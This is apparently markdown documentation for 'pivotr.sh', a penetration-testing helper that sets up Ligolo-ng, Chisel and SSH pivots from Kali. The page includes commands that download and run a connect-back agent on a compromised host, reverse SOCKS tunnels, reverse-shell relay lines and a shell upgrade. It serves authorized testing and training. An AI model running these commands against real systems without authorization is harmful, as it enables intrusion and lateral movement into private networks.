---
tags:
  - phase/post-exploitation
  - phase/pivoting
  - tool/pivotr
  - tool/ligolo
  - tool/chisel
  - tool/ssh
  - type/tool-docs
---
# pivotr.sh

## What It Is
Kali-side pivot setup and reference assistant. Automates Ligolo-ng TUN interface creation, route injection, proxy startup, and agent transfer. Also generates fully resolved copy-paste commands for SSH tunnels and Chisel — no unfilled placeholders. Runs **on Kali only**, never touches compromised hosts.

> [!important] Setup and reference only — no exploitation
> OffSec compliant. State tracked in `$TOOLKIT_ROOT/pivots/state.tsv` for clean teardown.

---

## Quick Reference

```bash
# Ligolo single pivot — foreground interactive console (default, most common)
./pivotr.sh ligolo --subnet 10.10.10.0/24 --serve

# Ligolo single pivot — background/daemon mode (no interactive console)
./pivotr.sh ligolo --subnet 10.10.10.0/24 --serve --daemon

# Ligolo double pivot (second internal network)
./pivotr.sh ligolo2 --subnet 172.16.1.0/24

# Add Ligolo listeners (for reverse shells through tunnel)
./pivotr.sh listener --port 4444 --port 80 --type both

# SSH dynamic SOCKS proxy
./pivotr.sh ssh --type dynamic --pivot-ip 10.10.10.5 --pivot-user www-data

# SSH local port forward
./pivotr.sh ssh --type local --pivot-ip 10.10.10.5 --target-ip 172.16.1.10 --target-port 3389

# Chisel SOCKS (when SSH unavailable)
./pivotr.sh chisel --type socks --start-server

# Access pivot's localhost services (after tunnel is up)
sudo ip route add 240.0.0.1/32 dev ligolo

# Reconnect last tunnel (after VPN drop / shell loss)
./pivotr.sh reconnect

# Status and teardown
./pivotr.sh status
./pivotr.sh teardown --all

# Disable ANSI colors (global flag — goes before the mode)
./pivotr.sh --no-color ligolo --subnet 10.10.10.0/24   # or: export NO_COLOR=1
```

---

## Decision Tree

```
Have SSH on pivot with valid creds?
├─ YES → pivotr.sh ssh --type dynamic     (quickest, no binary upload needed)
└─ NO  → can you upload a binary?
         ├─ YES → pivotr.sh ligolo        (preferred: full IP routing, no proxychains)
         └─ NO  → pivotr.sh chisel        (pure SOCKS, client connects back)

Need to reach a SECOND internal network?
└─ pivotr.sh ligolo2 --subnet 172.16.1.0/24
   + listener_add in Ligolo console for agent forwarding

Need to catch reverse shells through an existing Ligolo tunnel?
└─ pivotr.sh listener --port 4444 --type shell
   (listener_add in console + penelope -p 4444 -O on Kali)

Need to forward ONE specific internal port (not full routing)?
├─ SSH available  → pivotr.sh ssh --type local
└─ SSH not avail  → pivotr.sh chisel --type forward
```

---

## Mode: `ligolo` — Single Pivot

Creates TUN interface, adds route, starts proxy, optionally serves agent binaries via HTTP.

```bash
# Minimal (foreground, interactive console — default)
./pivotr.sh ligolo --subnet 10.10.10.0/24

# With file server (auto-serves agent binaries for transfer)
./pivotr.sh ligolo --subnet 10.10.10.0/24 --serve

# Background/daemon mode (no interactive console — use WebUI)
./pivotr.sh ligolo --subnet 10.10.10.0/24 --serve --daemon

# All options (defaults shown; omit any flag to use the default)
./pivotr.sh ligolo \
  --subnet 10.10.10.0/24 \
  --pivot-ip 10.10.10.5 \
  --port 11601 \
  --tun-name ligolo \
  --kali-ip 10.10.14.1 \
  --serve \
  --serve-port 80
```

**What it does automatically:**
1. Auto-detects Kali IP (tun0 → eth0 → `hostname -I`)
2. Finds `ligolo-proxy` binary (checks PATH + `/opt/ligolo-ng`, `$HOME/tools/ligolo-ng`, etc.)
3. Creates TUN interface via `sudo ip tuntap add user $(whoami) mode tun ligolo`
4. Adds route: `sudo ip route add <subnet> dev ligolo`
5. If `--serve`: symlinks agent binaries, starts `python3 -m http.server` in background
6. Prints a fully resolved **NEXT STEPS** box
7. Starts `ligolo-proxy` **in the foreground** — this terminal becomes the Ligolo interactive console

> [!note] **`--daemon` / `--background` flag**: runs the proxy in the background (no interactive console). Use this only when you need the terminal free. In daemon mode the script prints instructions but you must use the WebUI or re-run without `--daemon` to interact with sessions.

---

### First-hop workflow (foreground, default)

> [!tip] **Recommended: use tmux.** Run `./pivotr.sh ligolo --subnet ... --serve` in one pane. The proxy console lives there. Use a second pane for agent transfer, shell work, and recon.

**Step 1 — start the proxy (this terminal becomes the Ligolo console):**
```bash
./pivotr.sh ligolo --subnet 10.10.10.0/24 --serve
# ligolo» prompt appears — this terminal is now the Ligolo console.
```

**Step 2 — transfer the agent (second terminal or tmux pane):**
```bash
# Linux:
wget http://KALI_IP:80/agent -O /tmp/agent && chmod +x /tmp/agent
# Windows:
iwr http://KALI_IP:80/agent.exe -O agent.exe
```

**Step 3 — run the agent on the pivot host:**
```bash
# Linux:
/tmp/agent -connect KALI_IP:11601 -ignore-cert
# Windows:
.\agent.exe -connect KALI_IP:11601 -ignore-cert
```
The agent connects back automatically and sits there — it does not exit. The Ligolo console (first terminal) shows the new session appearing.

**Step 4 — activate the tunnel (back in the Ligolo console):**
```bash
session                      # select the agent from the list
ifconfig                     # confirm the internal interface and subnet
tunnel_start --tun ligolo    # route traffic through the tunnel
```

**Step 5 — verify and enumerate (second terminal):**
```bash
nmap -sT -Pn -p 22,80,445 <INTERNAL_IP>             # confirm routing works
./recon.sh --auto <INTERNAL_HOST_IP>            # full recon on internal target
./adr.sh -dc <DC_IP> -u <USER> -p '<PASS>'           # if domain-joined
nxc smb <SUBNET>/24 --gen-relay-list /tmp/smb_hosts.txt   # find SMB hosts
```

> [!tip] Need reverse shells back through the tunnel? `./pivotr.sh listener --port 4444`

**Agent binary locations searched:**
- `/usr/share/ligolo-ng-common-binaries/` (apt package `ligolo-ng-common-binaries`)
- `./agent`, `$HOME/tools/ligolo-ng/agent`, `/opt/ligolo-ng/agent`

> [!tip] Access the pivot's localhost via `240.0.0.1` — Ligolo's magic IP. No port forward needed for services bound to 127.0.0.1 on the pivot.

---

## Mode: `ligolo2` — Double Pivot

Adds a second TUN + route for a second internal network reached through the first pivot. The proxy is already running from `ligolo` mode — this just extends routing.

```bash
./pivotr.sh ligolo2 --subnet 172.16.1.0/24
./pivotr.sh ligolo2 --subnet 172.16.1.0/24 --tun-name ligolo2  # default
```

**Printed next steps:**
```bash
# In Ligolo console on SESSION 1 (first pivot):
listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11602 --tcp
listener_list    # verify it appears

# In Ligolo console, SESSION 2:
tunnel_start --tun ligolo2
```

> [!tip] Magic IPs: `240.0.0.1` = pivot1's localhost, `240.0.0.2` = pivot2's localhost (double-nested)

---

## Mode: `listener` — Ligolo Console Listener Commands

Generates `listener_add` commands to paste into the Ligolo interactive console, plus shell catchers and file server commands.

```bash
./pivotr.sh listener --port 4444                          # both (default)
./pivotr.sh listener --port 4444 --type shell             # shell only
./pivotr.sh listener --port 80 --type file                # file server only
./pivotr.sh listener --port 4444 --port 80 --type both    # multiple ports
```

**Output example (`--port 4444 --type shell`):**
```
# Paste into Ligolo console:
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
listener_list   ← verify

# Shell catcher (run on Kali):
penelope -p 4444 -O
```

> [!important] Shell catchers use Penelope with `-O` (OffSec-safe flag) — not netcat.

> [!warning] `--type both` prints shell catcher AND file server commands for every port listed. A shell catcher and file server cannot bind the same port simultaneously — pick one per port, or pass separate ports with separate `--type` invocations.

**Once a reverse shell lands on Kali:**
```bash
# Upgrade shell first (on remote host):
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then enumerate the internal host from Kali:
./recon.sh --auto <INTERNAL_HOST_IP>   # note IP from shell, run recon
./escalatr.sh <INTERNAL_HOST_IP> --os linux # or --os windows, run from Kali
```

---

## Mode: `ssh` — SSH Tunnel Reference

Generates fully resolved SSH tunnel commands with all values filled in from flags. Kali IP auto-detected if not provided.

### Dynamic SOCKS Proxy
```bash
./pivotr.sh ssh --type dynamic --pivot-ip 10.10.10.5 --pivot-user www-data --socks-port 9999

# Run ON KALI:
ssh -N -D 0.0.0.0:9999 www-data@10.10.10.5 -p 22

# proxychains.conf:
socks5 127.0.0.1 9999

# Verification commands are printed after tunnel setup:
proxychains -q curl -s http://172.16.1.10          # HTTP reachability
proxychains -q nxc smb 172.16.1.0/24               # SMB sweep
proxychains -q nmap -sT -Pn -p 80,443,445 172.16.1.10  # port check (must use -sT -Pn)
```

### Local Port Forward
```bash
./pivotr.sh ssh --type local \
  --pivot-ip 10.10.10.5 --pivot-user user \
  --target-ip 172.16.1.10 --target-port 3389 \
  --local-port 13389

# Run ON KALI:
ssh -N -L 0.0.0.0:13389:172.16.1.10:3389 user@10.10.10.5 -p 22
# Verification commands are printed after tunnel setup:
curl -s http://localhost:13389        # HTTP services
nc -zv localhost 13389                # TCP check (non-HTTP)
# If not working: check ssh is running, ufw status, confirm pivot routing
```

### Remote Port Forward (pivot initiates)
```bash
./pivotr.sh ssh --type remote \
  --target-ip 127.0.0.1 --target-port 8080 --local-port 8080

# Run ON PIVOT:
ssh -N -R 127.0.0.1:8080:127.0.0.1:8080 kali@KALI_IP
# Verify tunnel works (run on Kali after pivot connects):
nc -zv localhost 8080                    # TCP port check
curl -s --connect-timeout 3 http://localhost:8080  # if HTTP

# Check local port is bound: ss -tlnp | grep 8080
```

### Reverse Dynamic SOCKS (pivot initiates)
```bash
./pivotr.sh ssh --type remote-dynamic --socks-port 9999

# Run ON PIVOT:
ssh -N -R 9999 kali@KALI_IP
# Requires: sudo systemctl start ssh (on Kali)
```

### SSH Options

| Flag | Default | Description |
|------|---------|-------------|
| `--type` | required | `local`, `dynamic`, `remote`, `remote-dynamic` |
| `--pivot-ip` | — | Pivot host IP |
| `--pivot-user` | current user | SSH username on pivot |
| `--pivot-port` | 22 | SSH port on pivot |
| `--target-ip` | — | Internal target IP |
| `--target-port` | — | Internal target port |
| `--local-port` | target-port | Local Kali port to bind |
| `--kali-ip` | auto-detected | Kali IP (for remote tunnels) |
| `--kali-user` | kali | SSH username on Kali |
| `--socks-port` | 9999 | SOCKS proxy port (dynamic modes) |
| `--subnet` | — | Optional CIDR used to emit a grounded `sshuttle` follow-up for dynamic SSH pivots |

> [!warning] proxychains nmap must use `-sT -Pn` — SYN scans and ICMP do not traverse SOCKS.

### Pivot `next_steps.txt`

Each pivot mode now writes the current mode's grounded follow-up commands to:

```bash
cat $TOOLKIT_ROOT/pivots/next_steps.txt
```

The file is intentionally small and reflects the mode/options you used:

| Trigger | Commands emitted |
|---------|------------------|
| `ligolo` mode with a subnet | agent transfer, agent connect-back, `session`, `tunnel_start`, internal `nmap`, `recon.sh`, `adr.sh`, `nxc --gen-relay-list` |
| `ssh --type local` | `ssh -L`, verification commands, Plink equivalent, Windows `netsh interface portproxy` equivalent |
| `ssh --type dynamic` | `ssh -D`, proxychains line, `nmap -sT -Pn`, `recon.sh` through proxychains, and `sshuttle` when `--subnet` is provided |
| `ssh --type remote` | Kali `sshd` check, `ssh -R`, verification commands, GatewayPorts check |
| `ssh --type remote-dynamic` | reverse SOCKS, proxychains line, internal recon through proxychains |
| `chisel --type socks` | reverse SOCKS server/client pair, proxychains line, internal recon commands |
| `chisel --type forward` | reverse port-forward pair and local verification commands |

---

## Mode: `chisel` — Chisel Tunnel Reference

Use when SSH is unavailable on the pivot. Kali runs the server; pivot runs the client (reverse connection).

### SOCKS Proxy
```bash
./pivotr.sh chisel --type socks

# Run ON KALI:
chisel server -p 8080 --socks5 --reverse

# Run ON PIVOT:
chisel client KALI_IP:8080 R:9999:socks

# proxychains.conf:
socks5 127.0.0.1 9999
```

```bash
# Start chisel server on Kali immediately
./pivotr.sh chisel --type socks --start-server
```

**Verify SOCKS proxy (after pivot connects):**
```bash
proxychains -q nxc smb <INTERNAL_SUBNET>/24          # SMB sweep
proxychains -q curl -s http://<INTERNAL_IP>           # HTTP test
proxychains -q nmap -sT -Pn -p 22,80,445 <INTERNAL_IP>  # port check (must use -sT -Pn)

# Then enumerate through the proxy:
proxychains ./recon.sh --auto <INTERNAL_IP>
proxychains ./adr.sh -dc <DC_IP> -u <USER> -p '<PASS>'  # if AD
```

### Port Forward
```bash
./pivotr.sh chisel --type forward \
  --target-ip 172.16.1.10 --target-port 3389 --local-port 13389

# Run ON KALI:
chisel server -p 8080 --reverse

# Run ON PIVOT:
chisel client KALI_IP:8080 R:13389:172.16.1.10:3389

# Access on Kali: localhost:13389
```

### Chisel Options

| Flag | Default | Description |
|------|---------|-------------|
| `--type` | required | `socks` or `forward` |
| `--kali-ip` | auto-detected | Kali IP for client connect |
| `--port` | 8080 | Chisel server listen port |
| `--socks-port` | 9999 | Local SOCKS port (socks type) |
| `--target-ip` | — | Forward destination |
| `--target-port` | — | Forward destination port |
| `--local-port` | target-port | Local Kali port |
| `--start-server` | off | Start chisel server on Kali now |

---

## Mode: `status`

```bash
./pivotr.sh status
```

Shows: TUN interfaces, routes via ligolo interfaces, running `ligolo-proxy` processes, running `chisel` processes, running `python3 -m http.server` processes.

---

## Mode: `teardown`

```bash
# Remove everything tracked (routes, TUN interfaces, background processes)
./pivotr.sh teardown --all

# Remove a specific route only
./pivotr.sh teardown --subnet 10.10.10.0/24

# Custom TUN names
./pivotr.sh teardown --tun-name ligolo --tun2-name ligolo2
```

State is tracked in `$TOOLKIT_ROOT/pivots/state.tsv`. Teardown reads this file to know what it created. TUN and route removal requires `sudo`.

> [!tip] Ctrl+C during `ligolo` (foreground or daemon) or `chisel --start-server` kills all background processes (file server, daemon proxy) automatically via trap handler.

---

## Mode: `reconnect` — Restore Last Tunnel

Re-establishes the most recently configured tunnel after a VPN drop, shell loss, or Kali restart. Reads the last tunnel configuration from `$TOOLKIT_ROOT/pivots/state.tsv` and replays it.

```bash
./pivotr.sh reconnect
```

**What it does:**
1. Reads last `tunnel` entry from `$TOOLKIT_ROOT/pivots/state.tsv`
2. Tears down any stale TUN interfaces, routes, or processes
3. Re-runs the original `ligolo` or `chisel` setup with the same parameters

> [!tip] Use this when your VPN reconnects mid-engagement and your Ligolo tunnel needs to come back up. The agent on the pivot is still running — you just need to restart the proxy side.

> [!note] `reconnect` only restores the Kali-side setup. You still need to re-run the agent on the pivot host if it also died.

---

## Install

```bash
# Ligolo-ng proxy + pre-built agent binaries
sudo apt install ligolo-ng ligolo-ng-common-binaries

# Download: https://github.com/jpillora/chisel/releases
sudo cp chisel_linux_amd64 /usr/local/bin/chisel && sudo chmod +x /usr/local/bin/chisel

# Add:    socks5 127.0.0.1 9999
```

---

---

## What pivotr.sh Won't Handle — Manual Pivot Techniques

> [!important] The script automates Ligolo-ng, Chisel, and SSH dynamic forwarding. These are the gaps — manual forwarding patterns, troubleshooting, and environments where the automated setup fails.

---

### SSH Port Forwarding — Specific Service Access

When you need to reach one specific internal port (not full routing):

```bash
# Local forward — access internal TARGET:PORT as localhost:LOCALPORT on Kali
ssh -L LOCALPORT:INTERNAL_IP:TARGETPORT user@PIVOT_IP -N -f
# Example: reach internal RDP (3389) on 10.10.10.5 through pivot at 192.168.1.10
ssh -L 13389:10.10.10.5:3389 user@192.168.1.10 -N -f
xfreerdp /u:admin /p:pass /v:127.0.0.1:13389 /cert-ignore

# Remote forward — expose your Kali listener on the pivot (reverse shell relay)
ssh -R PIVOT_PORT:127.0.0.1:KALI_PORT user@PIVOT_IP -N -f
# Dynamic forward (SOCKS proxy) — manual version of pivotr.sh ssh
ssh -D 9050 user@PIVOT_IP -N -f
# Edit /etc/proxychains4.conf: socks5 127.0.0.1 9050
proxychains nmap -sT -Pn -p 22,80,443,445 10.10.10.5
```

---

### Chisel — When Ligolo Won't Run

If you can't run a binary with raw socket access (Ligolo requires TUN interface):

```bash
# Kali — start server
chisel server --port 9001 --reverse

# Pivot — connect as client (reverse SOCKS)
./chisel client KALI_IP:9001 R:9050:socks
# Kali server:
chisel server --port 9001 --reverse
# Pivot client:
./chisel client KALI_IP:9001 R:13389:INTERNAL_IP:3389
# Pivot server:
./chisel server --port 9002
# Kali client (when Kali can reach pivot but not internal):
chisel client PIVOT_IP:9002 9050:socks
```

---

### Double Pivot — Reaching a Third Network

When you need to go: Kali → Pivot1 → Pivot2 → Target3:

```bash
# In Ligolo console: add a listener on Pivot1 for the second agent
listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601

# On Pivot2 (reached through Pivot1's network):
./agent -connect PIVOT1_IP:11602 -ignore-cert

# In new terminal:
sudo ip route add 172.16.2.0/24 dev ligolo

# Then: proxychains4 -q -f proxychains_socks9050.conf nmap ...
```

---

### Catching Reverse Shells Through the Tunnel

The script sets up listeners, but if they fail or you need a different approach:

```bash
# In Ligolo console:
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
# SSH reverse forward (simpler when Ligolo isn't running):
ssh -R 4444:127.0.0.1:4444 user@PIVOT_IP -N -f
# On Pivot1: socat TCP-LISTEN:4444,fork TCP:KALI_IP:4444
```

---

### Troubleshooting When the Tunnel Stops Working

```bash
# 1. Check if the tunnel process is still running
ps aux | grep -E 'ligolo|chisel|agent'

# 2. Check if TUN interface is up (Ligolo)
ip addr show ligolo
ip route show | grep ligolo

# 3. Check if routes are still in place
ip route show | grep -E '10\.|172\.|192\.168'

# 4. Test through the tunnel (before assuming it's dead)
ping 10.10.10.5                   # if Ligolo, should work directly
proxychains curl -sk http://10.10.10.5   # if Chisel/SSH SOCKS

# 7. Check proxychains config is correct
cat /etc/proxychains4.conf | tail -5
# Run: proxychains curl http://10.10.10.5 -o /dev/null -v    # verbose test
```

---

### Accessing localhost Services on the Pivot Host

If the pivot is running a service bound to 127.0.0.1 (e.g., a database, internal admin panel):

```bash
# Ligolo — 240.0.0.1 is automatically mapped to pivot's localhost
curl http://240.0.0.1:8080/          # reaches pivot's localhost:8080
mysql -h 240.0.0.1 -P 3306 -u root   # reaches pivot's MySQL

# SSH local forward to pivot's localhost
ssh -L 8888:127.0.0.1:8080 user@PIVOT_IP -N -f
curl http://127.0.0.1:8888/           # reaches pivot's 127.0.0.1:8080

# Chisel — forward pivot's localhost port
./chisel client KALI:9001 R:8888:127.0.0.1:8080
curl http://127.0.0.1:8888/
```

---

## Related

- [[_SCRIPTS/ligolo-ng]] — manual Ligolo-ng commands, console reference, troubleshooting
- [[Tunneling_Pivoting]] — manual techniques and theory
- [[Active_Recon]] — scanning internal networks after pivot is established
- [[recon]] — run against internal hosts once routing is up
